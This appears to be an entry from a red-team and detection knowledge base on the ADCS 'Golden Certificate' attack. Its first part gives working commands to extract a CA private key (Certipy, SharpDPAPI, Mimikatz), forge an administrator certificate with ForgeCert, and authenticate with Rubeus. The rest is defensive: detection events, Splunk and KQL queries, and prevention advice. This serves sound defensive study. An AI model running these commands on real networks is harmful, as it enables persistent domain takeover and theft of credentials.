name: ForgeCert - Golden Certificate (Stolen CA Key)
description: ForgeCert forges certificates using a stolen CA private key (the "Golden Certificate" attack - DPERSIST1). With the CA cert and key, you can create certificates for ANY user, bypassing all template restrictions. This is the certificate equivalent of a Golden Ticket - persistent domain compromise until the CA key is rotated.
notes:
=== STEP 1: STEAL THE CA KEY ===
  # From the CA server (requires local admin on CA):
  # Option A - Certipy (Linux)
  certipy ca -backup -ca <ca_name> -u administrator@<domain> -p <pass>
  # Option B - SharpDPAPI (Windows)
  SharpDPAPI.exe certificates /machine
  # Option C - Mimikatz
  crypto::capi
  crypto::certificates /export /systemstore:LOCAL_MACHINE

=== STEP 2: FORGE CERTIFICATE ===
  ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=Administrator,CN=Users,DC=corp,DC=local" --SubjectAltName administrator@corp.local --NewCertPath admin.pfx --NewCertPassword "password"

=== STEP 3: AUTHENTICATE ===
  # Rubeus (Windows)
  Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:password /ptt
  # Certipy (Linux)
  certipy auth -pfx admin.pfx -dc-ip <dc_ip>

=== PERSISTENCE VALUE ===
CA certificates typically have 5+ year lifetimes. A stolen CA key
allows forging certs until the CA is rebuilt from scratch.
Password resets do NOT invalidate forged certificates.

examples.label: Forge admin certificate with stolen CA key

recommended.note: ESC1 gets initial cert abuse; ForgeCert is post-compromise persistence.
Certipy-based ESC1 exploitation leads to ForgeCert for persistence.

defense.why_it_works: The CA private key is the root of trust for all certificates. With it, any certificate can be forged with arbitrary SANs, bypassing template and enrollment restrictions entirely.
defense.prerequisites: Local admin on the CA server to extract the CA private key and certificate.
defense.impact: Persistent domain compromise; forged certificates survive password resets and remain valid for years.
defense.detection: [MITRE T1649] Certificates issued outside normal ADCS enrollment (no corresponding 4886/4887 events); Certipy/Rubeus PKINIT auth with unexpected certificates.
defense.artifacts: Missing Event 4886/4887 (certificate request/issue) for the forged cert; Event 4768 with certificate-based pre-auth; CA private key access logs.
defense.splunk_spl:
index=windows EventCode=4768 PreAuthType=16
| eval cert_auth="PKINIT"
| join TargetUserName [search index=windows EventCode=4887 | stats count by TargetUserName]
| where isnull(count)
| table _time, TargetUserName, IpAddress
defense.sentinel_kql:
SecurityEvent
| where EventID == 4768 and PreAuthType == "16"
| project TimeGenerated, TargetUserName, IpAddress, ServiceName
defense.prevention: Protect CA private key with HSM; monitor CA backup operations; audit 4768 events with PKINIT pre-auth; implement certificate transparency logging.

detections.name: Golden Certificate - PKINIT auth without matching issuance
detections.logic:
let pkinit_auths = SecurityEvent
| where EventID == 4768 and PreAuthType == "16"
| project AuthTime=TimeGenerated, TargetUserName, IpAddress;
let cert_issues = SecurityEvent
| where EventID == 4887
| project IssueTime=TimeGenerated, RequesterName;
pkinit_auths
| join kind=leftanti (cert_issues) on $left.TargetUserName == $right.RequesterName
| project AuthTime, TargetUserName, IpAddress
detections.false_positives: Smart card authentication with pre-provisioned certificates
detections.tuning: Correlate with ADCS enrollment logs; whitelist known smart card users
